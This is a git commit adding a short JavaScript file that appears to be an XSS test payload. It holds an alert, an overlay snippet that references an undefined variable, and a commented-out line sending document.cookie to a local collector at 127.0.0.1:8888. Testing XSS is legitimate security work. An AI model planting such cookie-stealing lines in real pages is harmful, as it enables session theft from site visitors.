1132966aee33e0826eca1afe58ad0bdb08b339ca
B00TK1D <55107317+B00TK1D@users.noreply.github.com>
2021-09-21 22:21:12 -0600

    initial

---
+++ e.js
@@ -0,0 +1,7 @@
+//var i=new Image;i.src="http://127.0.0.1:8888/?"+document.cookie;
+alert("hello");
+
+
+document.createElement('script',{src:''})
+elemDiv.style.cssText = 'position:absolute;width:100%;height:100%;opacity:0.3;z-index:100;background:#000;';
+document.body.appendChild(elemDiv);
